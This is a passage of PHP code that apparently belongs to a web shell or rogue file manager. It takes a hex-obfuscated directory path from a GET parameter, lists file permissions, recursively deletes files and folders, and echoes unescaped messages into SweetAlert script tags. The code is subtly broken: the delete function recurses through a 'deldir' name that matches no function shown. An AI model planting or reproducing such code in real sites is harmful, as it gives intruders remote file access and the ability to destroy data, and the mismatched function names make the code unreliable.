    $currentPath = decodeHex($_GET["p"]);
    chdir(decodeHex($_GET["p"]));
} else {
    $currentPath = getcwd();
}
function encodeHex(string $value): string
{
    return bin2hex($value);
}
function decodeHex(string $value): string
{
    $decodedValue = hex2bin($value);
    return $decodedValue === false ? "" : $decodedValue;
}
function formatPermissions(string $path): string
{
    $currentPath = fileperms($path);
    if (($currentPath & 0xC000) == 0xC000) $index = 's';
    elseif (($currentPath & 0xA000) == 0xA000) $index = 'l';
    elseif (($currentPath & 0x8000) == 0x8000) $index = '-';
    elseif (($currentPath & 0x6000) == 0x6000) $index = 'b';
    elseif (($currentPath & 0x4000) == 0x4000) $index = 'd';
    elseif (($currentPath & 0x2000) == 0x2000) $index = 'c';
    elseif (($currentPath & 0x1000) == 0x1000) $index = 'p';
    else $index = 'u';
    $index .= (($currentPath & 0x0100) ? 'r' : '-');
    $index .= (($currentPath & 0x0080) ? 'w' : '-');
    $index .= (($currentPath & 0x0040) ? (($currentPath & 0x0800) ? 's' : 'x') : (($currentPath & 0x0800) ? 'S' : '-'));
    $index .= (($currentPath & 0x0020) ? 'r' : '-');
    $index .= (($currentPath & 0x0010) ? 'w' : '-');
    $index .= (($currentPath & 0x0008) ? (($currentPath & 0x0400) ? 's' : 'x') : (($currentPath & 0x0400) ? 'S' : '-'));
    $index .= (($currentPath & 0x0004) ? 'r' : '-');
    $index .= (($currentPath & 0x0002) ? 'w' : '-');
    $index .= (($currentPath & 0x0001) ? (($currentPath & 0x0200) ? 't' : 'x') : (($currentPath & 0x0200) ? 'T' : '-'));
    return $index;
}
function showMessage(string $message, int $status = 1, string $redirect = ""): void
{
    global $currentPath;
    $alertType = (($status == 1) ? "success" : "error");
    echo "<script>swal({title: \"{$alertType}\", text: \"{$message}\", icon: \"{$alertType}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . encodeHex($currentPath) . $redirect . "\"}})</script>";
}
function deletePath(string $entry): void
{
    if (trim(pathinfo($entry, PATHINFO_BASENAME), '.') === '') return;
    if (is_dir($entry)) {
        array_map("deldir", glob($entry . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
        rmdir($entry);
    } else {
        unlink($entry);
    }
} ?>
